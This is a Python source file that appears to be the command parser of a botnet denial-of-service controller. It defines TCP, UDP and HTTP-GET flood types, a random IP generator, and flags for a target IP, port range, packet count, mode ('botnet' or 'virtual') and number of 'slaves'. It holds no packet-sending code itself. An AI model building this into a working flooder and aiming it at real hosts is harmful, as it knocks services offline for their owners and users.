import argparse
import random
import socket

attacks = {
    '0' : 'TCP' ,
    '1' : 'UDP' ,
    '2' : 'HTTP-GET'
}


def ipGen() :
    ip = ['1','1','1','1']
    for _ in range(4):
        ip[_] = str(random.randint(1,255))
    return '.'.join(ip)

class Command :
    command = None
    slaves = None
    target = None 
    count = None
    aType = None
    ports = None
    mode = None 

    def __init__(self) :
        pass

    def __repr__(self) :
        print("Here")
        return f'Command(command={self.command},target={self.target},ports={self.ports},mode={self.mode},count={self.count},type={attacks[self.aType]},slaves={self.slaves})'

class ArgParseError(Exception) :
    def __init__(self,message="Argument Parse Exception") :
        self.message = 'ArgParseException : ' + message
        super().__init__(self.message)

class CommandError(Exception) :
    def __init__(self,message="Command Exception") :
        self.message = 'Command Exception : ' + message
        super().__init__(self.message)

def parse_args(args) :
    length = len(args)
    
    if length == 0 :
        return Command()

    cmd = Command()
    cmd.command = args[0]
    cmd.ports = '1-65536'
    cmd.mode = 'botnet'
    cmd.count = 100
    cmd.slaves = 255
    cmd.aType = '0'

    for i in range(1,length) :
        try :
            flag = args[i]

            if flag in ['-h','--host'] :
                cmd.target = args[i+1]
                try :
                    socket.inet_aton(cmd.target)
                    if len(cmd.target.split('.')) != 4 :
                        raise OSError()
                except OSError:
                    cmd.target = None
                    raise ArgParseError(f"{args[i+1]} is not a valid IP")
            
            elif flag in ['-m','--mode'] :
                cmd.mode = args[i+1]
                if cmd.mode not in ['botnet','virtual'] :
                    raise ArgParseError(f"Mode must be 'botnet'/'virtual' not '{cmd.mode}'")

            elif flag in ['-c','--count'] :
                cmd.count = int(args[i+1])
            
            elif flag in ['-s','--slaves'] :
                if args[i+1] == 'all' :
                    cmd.slaves = 255
                else :                
                    cmd.slaves = int(args[i+1])

            elif flag in ['-t','--type'] :
                cmd.aType = args[i+1]

            elif flag in ['-p','--ports'] :
                cmd.ports = args[i+1]
                if cmd.ports == 'all' :
                    cmd.ports = '1-65536'
                if len(cmd.ports.split('-')) == 1 :
                    cmd.ports = f'{cmd.ports}-{int(cmd.ports)+1}' 
        except IndexError :
            raise ArgParseError('Incomplete Command')
        except BaseException as e :
            raise ArgParseError(str(e))

    return cmd